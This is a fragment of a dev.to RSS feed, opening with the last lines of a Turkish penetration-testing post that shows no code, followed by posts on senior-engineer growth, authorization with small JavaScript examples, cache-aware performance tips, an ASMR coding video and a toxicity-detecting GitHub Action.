&lt;p&gt;Ayarlarƒ± yaptƒ±ktan sonra exploiti √ßalƒ±≈ütƒ±rabiliriz.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--WOHClr0o--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/63izb3cpcjb1z9r5hke9.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--WOHClr0o--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/63izb3cpcjb1z9r5hke9.png" alt="Image description" width="880" height="360"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Ve g√∂rd√ºƒü√ºn√ºz gibi tekrardan kar≈üƒ± sisteme sƒ±zmƒ±≈ü bulunmaktayƒ±z...&lt;/p&gt;

</description>
      <category>cybersecurity</category>
      <category>linux</category>
    </item>
    <item>
      <title>What it takes to be a Senior Engineer</title>
      <author>Daniel Kassen</author>
      <pubDate>Tue, 07 Dec 2021 20:45:05 +0000</pubDate>
      <link>https://dev.to/dkassen/what-it-takes-to-be-a-senior-engineer-51fp</link>
      <guid>https://dev.to/dkassen/what-it-takes-to-be-a-senior-engineer-51fp</guid>
      <description>&lt;p&gt;Hello Friends.&lt;/p&gt;

&lt;p&gt;I finally did it. Happened about a month and a half ago. I was ‚ú® promoted ‚ú® to a senior level engineering position. Want to know the most frustrating part about it? It didn't feel like I deserved it. Yes, imposter syndrome sticks with you.&lt;/p&gt;

&lt;p&gt;I started my career as a software engineer five years ago after working a job as a developer at a small startup that just needed hands and thoughts which I kinda see as my boot camp experience.&lt;/p&gt;

&lt;p&gt;I started my "engineering" career at a larger, yet still small startup in San Francisco, where I learned a lot, but not enough to become a senior there. I did primarily backend work with a spattering of frontend excursions. I got close to senior at that company. So close that my manager wasn't able to pinpoint anything specific to work on.&lt;/p&gt;

&lt;p&gt;I was good enough though to land a job at a larger, public company where I was given a position that was once called senior (but was actually software engineer III). The job didn't feel senior and I didn't feel senior. I've stayed at this company for over two years, learned how things work, started working in the frontend, started planning projects, started running certain meetings, and it finally happened. I got promoted. That's the basic history. Five years. Expect that long.&lt;/p&gt;

&lt;p&gt;Now for what &lt;em&gt;actually&lt;/em&gt; got me to where I am.&lt;/p&gt;

&lt;p&gt;You need expertise in the technology. I have four years of experience as a backend engineer and one as a fullstack engineer. I know databases, APIs, graphQL, react and redux, bash, vim, how to use my IDE effectively, how to test things properly, a bit about AWS, networking, algorithms and data structures, design patterns, architecture best practices.. the list goes on. There's a lot you need to know -- some you'll encounter in your day-to-day, some you need to seek out. I read a lot of books. Things will start to meld together and your thoughts and ideas will become more complex without you even noticing.&lt;/p&gt;

&lt;p&gt;You need expertise in yourself. My work ethic has fluctuated over the years, but like the Dow Jones, it inches up ever so slightly over time. You need to learn how to use your time effectively. You need to know your limits, set boundaries, and keep focused on one thing at a time, as much as possible. Time management is a skill you build up over time (is that a pun? not a good one, if so) and I -still- suck at it, but I'm  getting better as more responsibility is piled on to my plate.&lt;/p&gt;

&lt;p&gt;You need expertise in interpersonal communication. If you've read the 7 habits of highly effective people (if you haven't do it, and read it slowly, and absorb what he is saying), you might recognize that the first two paragraphs of what you need are all about becoming independent. Independent is good, but the real magic comes from interdependence -- working with a team of independent people who leverage each other's strengths to create something much bigger and stronger than they are alone. You need to learn how to communicate your problems, what you know, how you can help, what you need help with. Communication is something I can't effectively teach, it's just something that comes with time and experience. One thing I can advise is this -- listen twice as much as you speak. Not just at your job, but in every aspect of your life. Listen to understand, not to respond.&lt;/p&gt;

&lt;p&gt;I probably didn't hit on every detail precisely, because your journey will differ from mine. Like I said, this kind of came together over the course of 5 years, plus the boot camp time. Invest in yourself. Learn as much as you can. Bring value to your team, your customers, and yourself. You can do it, so stick to it.&lt;/p&gt;

&lt;p&gt;Thanks for reading.&lt;/p&gt;

</description>
    </item>
    <item>
      <title> JavaScript Keyboard events on ubuntu system</title>
      <author>gwendolinebinya</author>
      <pubDate>Tue, 07 Dec 2021 20:31:41 +0000</pubDate>
      <link>https://dev.to/gwendolinebinya/javascript-keyboard-events-on-ubuntu-system-5c6</link>
      <guid>https://dev.to/gwendolinebinya/javascript-keyboard-events-on-ubuntu-system-5c6</guid>
      <description>&lt;p&gt;I am having problems firing &lt;br&gt;
JavaScript keyboard events on my laptop which has ubuntu.the program works well with windows.Any one who has encountered such a problem? And how did you resolve it&lt;/p&gt;

</description>
      <category>javascript</category>
      <category>beginners</category>
      <category>ubuntu</category>
    </item>
    <item>
      <title>What is Authorization (with examples)</title>
      <author>propelauthblog</author>
      <pubDate>Tue, 07 Dec 2021 20:05:08 +0000</pubDate>
      <link>https://dev.to/propelauth/what-is-authorization-with-examples-33cp</link>
      <guid>https://dev.to/propelauth/what-is-authorization-with-examples-33cp</guid>
      <description>&lt;p&gt;The word "auth" is complicated because there a wide range of topics that fall in the bucket of "auth." In this series, we'll take a practical approach to understanding many of these topics with examples to learn from.&lt;/p&gt;

&lt;p&gt;Previously, we wrote about &lt;a href="https://blog.propelauth.com/understanding-user-authentication-from-scratch/"&gt;user authentication&lt;/a&gt;. Now, let's look at a related topic, authorization.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#what-is-authorization"&gt;
  &lt;/a&gt;
  What is Authorization?
&lt;/h2&gt;

&lt;p&gt;Authorization is the process of determining if someone has access to something. This is different from authentication, which is about determining who someone is in the first place.&lt;/p&gt;

&lt;p&gt;As an example, imagine we are building a simplified Twitter. Users can sign up, post tweets, and delete tweets. When we receive a request to delete a tweet, we need to do two things:&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;Determine who made the request&lt;/li&gt;
&lt;li&gt;Determine if they are allowed to delete the tweet&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Step 1 is authentication - we are determining &lt;strong&gt;who&lt;/strong&gt; the user is. Step 2 is authorization - we are determining if that user &lt;strong&gt;is allowed&lt;/strong&gt; to delete the tweet.&lt;/p&gt;

&lt;p&gt;In this case, step 2 could be as simple as only the user that made the tweet is allowed to delete it:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight javascript"&gt;&lt;code&gt;&lt;span class="kd"&gt;function&lt;/span&gt; &lt;span class="nx"&gt;canDeleteTweet&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;request&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;tweet&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="c1"&gt;// Authentication&lt;/span&gt;
    &lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;userId&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;getUserThatMadeTheRequest&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;request&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

    &lt;span class="c1"&gt;// Authorization &lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="nx"&gt;userId&lt;/span&gt; &lt;span class="o"&gt;===&lt;/span&gt; &lt;span class="nx"&gt;tweet&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;userId&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Step 2 could also include other rules, like maybe we hire a moderation team and allow them to delete tweets as well:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight javascript"&gt;&lt;code&gt;&lt;span class="kd"&gt;function&lt;/span&gt; &lt;span class="nx"&gt;canDeleteTweet&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;request&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;tweet&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="c1"&gt;// Authentication&lt;/span&gt;
    &lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;userId&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;getUserThatMadeTheRequest&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;request&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

    &lt;span class="c1"&gt;// Authorization &lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="nx"&gt;userId&lt;/span&gt; &lt;span class="o"&gt;===&lt;/span&gt; &lt;span class="nx"&gt;tweet&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;userId&lt;/span&gt; &lt;span class="o"&gt;||&lt;/span&gt; &lt;span class="nx"&gt;isUserAModerator&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;userId&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;h2&gt;
  &lt;a href="#implementing-authorization"&gt;
  &lt;/a&gt;
  Implementing Authorization
&lt;/h2&gt;

&lt;p&gt;There are a lot of different approaches to implementing authorization. One example that you might have come across before is role-based access control (RBAC). Role-based access control is a fancy way of saying "assign each user to a role (or group) and each role has a defined set of actions they can take".&lt;/p&gt;

&lt;p&gt;We actually already looked at an example of RBAC above. In our simplified Twitter example, we had two roles:&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;
&lt;strong&gt;Moderators&lt;/strong&gt; &lt;/li&gt;
&lt;li&gt;
&lt;strong&gt;Users&lt;/strong&gt; (we implicitly defined this as everyone who isn't a moderator)&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Users can create tweets and delete their own tweets. Moderators can delete anyone's tweets.&lt;/p&gt;

&lt;p&gt;You can extend this in a lot of ways. For example, maybe your roles are hierarchical. Each role has its own set of permissions and also gets all the permissions from any role beneath it in the hierarchy.&lt;/p&gt;

&lt;p&gt;RBAC is generally seen as a coarser form of authorization, since each user must belong to a role and every user within that role gets the same permissions. Another example approach is attribute-based access control (ABAC), where you look at attributes (e.g. what team the user is on, is this production or staging, etc.) to determine if a user can perform some action.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#authorization-for-b2b-businesses"&gt;
  &lt;/a&gt;
  Authorization for B2B Businesses
&lt;/h2&gt;

&lt;p&gt;Let's look at another example - building a B2B / SaaS business. In this case, let's say we're making an MVP of &lt;a href="https://slack.com/"&gt;Slack&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;In a B2B business, users will use your product along with their coworkers. To accommodate that, each user can be a member of an organization. &lt;/p&gt;

&lt;p&gt;The first permission that we need is the ability to create an organization and every user should be allowed to do it. Once an organization is created, we have three hierarchical roles:&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;
&lt;strong&gt;Owner&lt;/strong&gt; - Able to delete the organization, manage billing, and invite new owners&lt;/li&gt;
&lt;li&gt;
&lt;strong&gt;Admin&lt;/strong&gt; - Able to create new channels, manage organization settings, and invite new admins/members&lt;/li&gt;
&lt;li&gt;
&lt;strong&gt;Member&lt;/strong&gt; - Able to send messages in any channel&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Importantly, these roles apply only within the context of an organization. I can be an &lt;strong&gt;Owner&lt;/strong&gt; of organization A and a &lt;strong&gt;Member&lt;/strong&gt; of organization B. Those roles dictate my permissions within the organization - not globally.&lt;/p&gt;

&lt;p&gt;Since these roles are hierarchical, Admins have all the permissions that Members have, and Owners have all the permissions that Admins have.&lt;/p&gt;

&lt;p&gt;The Owner, Admin, and Member hierarchy is straightforward, and works for a lot of B2B businesses but it can be tricky to manage in practice. If you'd prefer to let someone else handle it, &lt;a href="https://www.propelauth.com"&gt;PropelAuth&lt;/a&gt; provides this structure by default - including UIs for inviting users, UIs for managing roles, and libraries for adding authorization to your backend.&lt;/p&gt;

</description>
      <category>programming</category>
      <category>tutorial</category>
      <category>security</category>
      <category>webdev</category>
    </item>
    <item>
      <title>Tips for writing performant code</title>
      <author>Demetre</author>
      <pubDate>Tue, 07 Dec 2021 20:00:45 +0000</pubDate>
      <link>https://dev.to/demetrejou/tips-for-writing-performant-code-2c4</link>
      <guid>https://dev.to/demetrejou/tips-for-writing-performant-code-2c4</guid>
      <description>&lt;h2&gt;
  &lt;a href="#why-performant-code-is-all-about-memory"&gt;
  &lt;/a&gt;
  Why performant code is all about memory
&lt;/h2&gt;

&lt;p&gt;Increasing the performance of a given piece of code is not as simple as throwing more ram, more GHz, or more cores by cranking the cloud provider's knob to 11. Decreasing the runtime of a serial program or improving the scaling per core of a parallel program requires not only a deeper understanding of the underlying hardware, but also writing code with that hardware in mind.&lt;/p&gt;

&lt;p&gt;While it is true that the number of transistors has doubled each year, the per-core frequency has been tapering off since 2010. CPUs single-core performance has started to follow the same tampering off trend. In contrast, the number of logical cores per processor has doubled every few years. In recent history, AMD's Ryzen line has pushed 4 cores / 8 threads from being the top of the line to 32 cores / 32 threads now being top of the line.&lt;/p&gt;

&lt;p&gt;While the number of transistors and logical cores continues to climb every year, unfortunately, the speed of memory accesses has not. The gap between the speed the CPU can process numbers and the speed it can access memory from cache or main memory has grown every year. For any modern machine, the time spent pulling data from memory vastly overshadows that of actually doing useful computations. This is why, when trying to improve the run time performance of code, it is not a technique to decrease the number of computations that materialize the largest improvement. It instead requires changes to how data is used and accessed. It is techniques to best utilizing the cache that specifically has the biggest effect.&lt;/p&gt;

&lt;p&gt;An easy to understand generalization of modern memory is that there are 2 levels. The first, being a small but very fast cache and the other, a slow but larger main memory (or DRAM). When something is initially loaded from DRAM to be used by the CPU, it is also placed into the cache, evicting something else to take its place. This simple model is nice, but in reality, there are multiple cache layers and multiple ways to pick what to evict. Things like hardware prefetching and cache lines also come into play. Those topics are all much outside the scope of this article, but interesting to read about nonetheless. This nice and simple model is what we're going to use. For reference, reading from cache is an order of magnitude faster than reading from main memory. It takes single-digit nano-seconds (ns) to read from cache vs. ~100ns to read from main memory, although this still depends entirely on specific hardware.  While a programmer can't directly choose what goes into cache and what gets evicted, they can still get a very good idea. Being always cognizant of what's likely to be in cache and avoiding these slow memory accesses is the key to achieving a sizable speed up.&lt;/p&gt;

&lt;p&gt;This entire article will be written with C in mind but the main ideas are transferable to most anything else.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#foreword"&gt;
  &lt;/a&gt;
  Foreword
&lt;/h2&gt;

&lt;p&gt;Before trying to engineer code to run faster, the underlying algorithm should always be looked at first. There is almost no reason to try to optimize an O(n^2) algorithm when an O(n) one exists. While there are cases, especially when dealing with small amounts of data, that n^2 might be faster due to implementation details, this article is targeting algorithms running on data much larger than that. Nothing in this article will help make selection sort faster than merge sort for significantly large arrays.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#ways-to-increase-cache-hits"&gt;
  &lt;/a&gt;
  Ways to increase cache hits
&lt;/h2&gt;

&lt;p&gt;The whole name of the game to improve serial performance is increasing cache hits. Or otherwise, the goal is to reduce how often something is loaded from main memory. Either way, the end goal is to reduce the amount of time (cycles) it takes to load something into the CPU. The two major ways to do this is with the techniques of:&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;&lt;p&gt;Temporal locality and&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;Spatial locality.&lt;/p&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Before moving on, we should add a small but important twist to the simple memory model. When something is loaded from slow memory into cache, the level of granularity is not a single byte or word but an entire cache line. These cache lines are in the range of 64 or 128 bytes. When a single int is requested by the program and that int is in slow memory, the entire cache line the int is in is also brought into cache.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#temporal-locality"&gt;
  &lt;/a&gt;
  Temporal locality
&lt;/h3&gt;

&lt;p&gt;Reuse data that is already in cache.&lt;/p&gt;

&lt;p&gt;This means that once a value is loaded in for the first time, it should be used as much as possible. It should be mentioned that it‚Äôs never possible to 100% avoid slow memory accesses since at some point something has to be loaded in for the first time, even when considering cache lines.&lt;/p&gt;

&lt;p&gt;For an example, compare the following code snippets:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;for person in persons:

    person.first_name.lower()

// lots of unrelated memory loads here

for person in persons:

    person.last_name.lower()
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;vs&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;for person in persons:

    person.first_name.lower()
    person.last_name.lower()
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;While this is a quite simplified example, the idea is visible. For a large &lt;code&gt;persons&lt;/code&gt; array, each     &lt;code&gt;person&lt;/code&gt; will have to be loaded twice in the first example, but only once in the second. While a good compiler can see this and might fuse the loops together, it can't always rely on compiler optimizations to reordering large blocks of code. &lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#spatial-locality"&gt;
  &lt;/a&gt;
  Spatial locality
&lt;/h3&gt;

&lt;p&gt;Operate on data that are stored close to each other in memory and potentially would have been brought into cache together.&lt;br&gt;
Because data is brought into cache at the cache line level, adjacent data is also brought in cache. When iterating through a list, it is much better to access linearly instead of random accesses because of this.&lt;/p&gt;

&lt;p&gt;While most loops are linear by default, one must not forget about the instructions of the code itself. Those still need to be brought into cache and read in order to be executed. While this effect is small, having many function calls requires many jumps in instruction memory, creating more slow memory accesses. This is why some compilers will automatically inline functions, saving this extra function call overhead and potential slow memory access. Modern CPUs also do branch prediction which somewhat mitigates the performance hit of function calls or logical branching statements. Again though, one can't always rely on compiler optimizations when trying to squeeze out the little bit of performance that is possible. &lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#parallel-processing"&gt;
  &lt;/a&gt;
  Parallel Processing
&lt;/h2&gt;

&lt;p&gt;"But why can't you just add more cores to the code to make it run faster? Why bother spending time to make serial code faster?"&lt;/p&gt;

&lt;p&gt;Without fast serial code, the parallel code won't be good. All the same principles to making serial code fast apply to parallel code as well. Without these good fundamentals already satisfied, the parallel code will never be as fast as it could be. There are extra things to keep in mind when dealing with parallel code. Explaining how to decompose data, decompose tasks, schedule threads, and everything else required to make incredibly fast parallel code, would fill up an entire book. Instead, this article will mention just some basic things to keep in mind before trying to turn serial code into parallel.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#amdahls-law"&gt;
  &lt;/a&gt;
  Amdahl's Law
&lt;/h3&gt;

&lt;p&gt;Amdahl's law gives the formula for the theoretically speed up in run time of a task or program. Not all parts of a program can be parallelized. So, even with infinite cores and perfect parallelized code, there is still a minimum amount of run time because of the serial parts of the program. This is why focusing on writing fast serial code is important to do as a first step. Even if 90% of the program can be parallelized, with infinite cores the program can still only achieve a 10x speedup. If 75% of the program can be parallelized, the program can achieve at best a 4x speedup. Well-written serial code can easily achieve a 4x speedup by itself and is easier to write, easier to debug, and easier to understand.&lt;/p&gt;

&lt;p&gt;Starting with a slow serial implementation and trying to parallelize it will never give as good of results as writing very good serial code from the start and parallelizing that.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#embarrassing-parallel"&gt;
  &lt;/a&gt;
  Embarrassing parallel
&lt;/h3&gt;

&lt;p&gt;This is almost opposite to the idea of Amdahl's law. Amdahl's law says that even in the best case one can only achieve a modest speedup multiplier. Embarrassing parallel problems are ones in which little to no effort is required to effectively parallelize a problem. Sometimes these problems are also called perfectly parallel, or pleasingly parallel. The opposite of these would be inherently serial problems that can't be meaningfully parallelized at all.&lt;/p&gt;

&lt;p&gt;It's worth learning which types of problems are embarrassing parallel, because they're the low-hanging fruit when trying to decrease run time. These problems are normally characterized by having no interdependencies between tasks. The data can be easily split, no thread-to-thread communication is required. Things like password cracking, 3D video rendering, and numerical integration are all examples of this set of problems.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#parallelizing-isnt-free"&gt;
  &lt;/a&gt;
  Parallelizing isn't free
&lt;/h3&gt;

&lt;p&gt;For a given problem, where a large part of it can be parallelized and that part can be parallelized well, there is still an added runtime cost of parallelizing it. Only in outlier circumstances will no synchronization between threads be required. In C/C++, locking and unlocking mutexes still has a cost. While there are fewer (operating) system calls when the mutex isn't contested by other threads there is still additional overhead. There are other ways to synchronize threads, semaphores, signals, and barriers. These additional synchronization mechanics are often required to ensure program correctness and avoid race conditions. They also add additional developer overhead which is an extra thing to consider. There is no free lunch by parallelizing part of the algorithm. &lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#false-sharing"&gt;
  &lt;/a&gt;
  False Sharing
&lt;/h3&gt;

&lt;p&gt;When 2 threads load the same cache line into their respective caches and the cache line values are only read and not modified, there is no issue. However, when one thread writes to any part of that cache line, the entire cache line is now marked as invalid and written back to main memory. Whenever another thread tries to read that now invalid cache line, it will have to re-read it from slow memory even if it's trying to access a different part of the cache line. This issue is called false sharing and causes almost an artificial increase in run time. This problem can be commonly seen when an array is shared between threads. If each thread writes to a different index of the array, there will be no synchronization required, but the data access times will be very bad because that entire cache line will have to be reloaded from slow memory every time. This issue can be worked around by creating a new local variable for each thread instead of sharing the array, or padding the array with dummy values so that each thread is reading values at least one cache line away from each other.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#measure-scaling"&gt;
  &lt;/a&gt;
  Measure scaling
&lt;/h3&gt;

&lt;p&gt;In an ideal world, the run time decreases linearly with the number of threads or cores added. Real world use cases rarely reflect this ideal speed up. When measuring the speedup achieved by adding additional cores, there are two ways to measure it:&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;Strong Scaling&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;This is when the amount of data being worked on stays the same and the amount of cores increases,&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;Weak scaling&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;This is when the amount of data increases with the number of cores being added.&lt;/p&gt;

&lt;p&gt;These scaling amounts are by no means guaranteed to be the same, and it's worth investigating both of these scaling values when comparing a parallel version of a program to a serial version.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#things-not-mentioned"&gt;
  &lt;/a&gt;
  Things not mentioned
&lt;/h2&gt;

&lt;p&gt;While these topics are interesting and worth investigating in their own right, they're simply too complex for this article.&lt;/p&gt;

&lt;p&gt;Other kinds of compiler optimizations include:&lt;br&gt;
Optimizing registers,&lt;br&gt;
Different levels of gcc optimization e.g -O1, -O2, -O3,&lt;br&gt;
Loop unrolling,&lt;br&gt;
Different multi-processor models such as distributed systems and GPUs,&lt;br&gt;
Calculating efficiency, machine balance, and machine peak,&lt;br&gt;
Branch prediction on modern CPUs, and&lt;br&gt;
Hardware prefetching (or why iterating through a loop doesn't normally have cache misses).&lt;/p&gt;

</description>
    </item>
    <item>
      <title>ASMR JavaScript Home Budget App Coding</title>
      <author>Bek Brace</author>
      <pubDate>Tue, 07 Dec 2021 19:59:44 +0000</pubDate>
      <link>https://dev.to/bekbrace/asmr-javascript-home-budget-app-coding-5ebk</link>
      <guid>https://dev.to/bekbrace/asmr-javascript-home-budget-app-coding-5ebk</guid>
      <description>&lt;p&gt;This is a No Talk coding video session in my flat in Lodz, Poland on a rainy night with my hot cup of black coffee.&lt;/p&gt;

&lt;p&gt;ASMR coding a JavaScript Home Budget application, AKA "Expense Tracker" which is suitable for anyone that wants to keep track of their daily finances.&lt;/p&gt;

&lt;p&gt;No talk, just typing quietly on my mechanical keyboard "Genesis Thor 300 TKL".&lt;/p&gt;

&lt;p&gt;There's the video, so you can prepare your hot beverage and code along with me :&lt;/p&gt;

&lt;p&gt;&lt;iframe width="710" height="399" src="https://www.youtube.com/embed/aw78jgX0nU4"&gt;
&lt;/iframe&gt;
&lt;/p&gt;

&lt;p&gt;Hope you enjoy, guys&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#social-media"&gt;
  &lt;/a&gt;
  Social Media  
&lt;/h2&gt;

&lt;p&gt;Facebook : &lt;a href="https://www.facebook.com/bekbrace%E2%80%8B%E2%80%8B%E2%80%8B%E2%80%8B/"&gt;https://www.facebook.com/bekbrace‚Äã‚Äã‚Äã‚Äã/&lt;/a&gt; &lt;br&gt;
Twitter : &lt;a href="https://twitter.com/BekBrace/"&gt;https://twitter.com/BekBrace/&lt;/a&gt;&lt;br&gt;
Instagram : &lt;a href="https://www.instagram.com/bek_brace/"&gt;https://www.instagram.com/bek_brace/&lt;/a&gt;&lt;br&gt;
GitHub profile : &lt;a href="https://github.com/BekBrace/%E2%80%8B%E2%80%8B%E2%80%8B"&gt;https://github.com/BekBrace/‚Äã‚Äã‚Äã&lt;/a&gt;&lt;br&gt;
Website : &lt;a href="https://bekbrace.com/"&gt;https://bekbrace.com/&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Reach out  : &lt;a href="mailto:info@bekbrace.com"&gt;info@bekbrace.com&lt;/a&gt;&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#tools-used-in-video"&gt;
  &lt;/a&gt;
  Tools used in video:
&lt;/h2&gt;

&lt;p&gt;Microphone used in recording Blue Yeti&lt;br&gt;
Coding on Genesis Thor 300 TKL keyboard&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#support"&gt;
  &lt;/a&gt;
  Support
&lt;/h2&gt;

&lt;p&gt;Join the Channel &lt;br&gt;
OR&lt;br&gt;
‚òï Buy Me A Coffee : &lt;a href="https://www.buymeacoffee.com/bekbrace"&gt;https://www.buymeacoffee.com/bekbrace&lt;/a&gt;&lt;/p&gt;

</description>
      <category>html</category>
      <category>css</category>
      <category>javascript</category>
      <category>programming</category>
    </item>
    <item>
      <title>No Toxic Discussions</title>
      <author>Thomas Bnt</author>
      <pubDate>Tue, 07 Dec 2021 19:23:43 +0000</pubDate>
      <link>https://dev.to/thomasbnt/no-toxic-discussions-38h3</link>
      <guid>https://dev.to/thomasbnt/no-toxic-discussions-38h3</guid>
      <description>&lt;blockquote&gt;
&lt;p&gt;üò∂ &lt;strong&gt;Disclaimer : Read that before use it&lt;/strong&gt;&lt;br&gt;
For this moment, this GitHub Actions &lt;strong&gt;don't work properly like I would like&lt;/strong&gt;. &lt;strong&gt;When GitHub add the possibility to add and/or edit comments in Discussions&lt;/strong&gt;, &lt;strong&gt;I will update the project&lt;/strong&gt;.&lt;br&gt;
I started this Action because I thinked that it is a good idea to have a moderate tool in Discussions part with the toxicity of comments So I did it thinking it would be feasible, but when I got to the end of the code part, I couldn't figure out how to create/edit comments.&lt;/p&gt;

&lt;p&gt;üòµ &lt;strong&gt;But why do I still participate in the Hackathon, knowing that my action is not entirely finished?&lt;/strong&gt; &lt;br&gt;
The idea of using the Perspective API came to me quite late. In 4-5 days I had to learn how to create my own GA (GitHub Actions) and how to execute JavaScript. How to use correctly the TOKEN of GitHub. I still have some small issues to fix on the source code, but I'm working on it, and like any project, there will be updates.&lt;/p&gt;

&lt;p&gt;So when I was almost at the end, I looked at the GitHub documentation to find out how to create a comment in the Discussions with Action section. Unfortunately, it's not possible, and I'm disgusted. Nevertheless, I leave the source code visible for everybody, because when GitHub will have added this option, the code will be updated and possible to use in your repositories. &lt;br&gt;
If you want to know more about how it works, I redirect you to &lt;a href="https://github.com/thomasbnt/actions-NoToxicDiscussions#how-its-work"&gt;How it's work&lt;/a&gt; part.&lt;/p&gt;

&lt;p&gt;For the moment &lt;strong&gt;it scans&lt;/strong&gt; well and &lt;strong&gt;emits a percentage based on 1&lt;/strong&gt; &lt;strong&gt;the TOXICITY of the content&lt;/strong&gt;. &lt;/p&gt;
&lt;/blockquote&gt;




&lt;h3&gt;
  &lt;a href="#my-workflow"&gt;
  &lt;/a&gt;
  My Workflow
&lt;/h3&gt;

&lt;p&gt;&lt;strong&gt;No Toxic Discussions&lt;/strong&gt; &lt;/p&gt;


&lt;div class="ltag-github-readme-tag"&gt;
  &lt;div class="readme-overview"&gt;
    &lt;h2&gt;
      &lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--566lAguM--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev.to/assets/github-logo-5a155e1f9a670af7944dd5e12375bc76ed542ea80224905ecaf878b9157cdefc.svg" alt="GitHub logo"&gt;
      &lt;a href="https://github.com/thomasbnt"&gt;
        thomasbnt
      &lt;/a&gt; / &lt;a href="https://github.com/thomasbnt/actions-NoToxicDiscussions"&gt;
        actions-NoToxicDiscussions
      &lt;/a&gt;
    &lt;/h2&gt;
    &lt;h3&gt;
      A GitHub action that detects toxic messages in Discussions.
    &lt;/h3&gt;
  &lt;/div&gt;
&lt;/div&gt;


&lt;h3&gt;
  &lt;a href="#submission-category-maintainer-musthaves"&gt;
  &lt;/a&gt;
  Submission Category: Maintainer Must-Haves
&lt;/h3&gt;

&lt;h3&gt;
  &lt;a href="#yaml-file-or-link-to-code"&gt;
  &lt;/a&gt;
  Yaml File or Link to Code
&lt;/h3&gt;

&lt;p&gt;You can see this example of workflow at &lt;strong&gt;&lt;a href="https://github.com/thomasbnt/actions-NoToxicDiscussions/blob/main/.github/workflows/NoToxicDiscussionsHere.yml"&gt;.github/workflows/NoToxicDiscussions.yml&lt;/a&gt;&lt;/strong&gt;&lt;br&gt;
&lt;/p&gt;

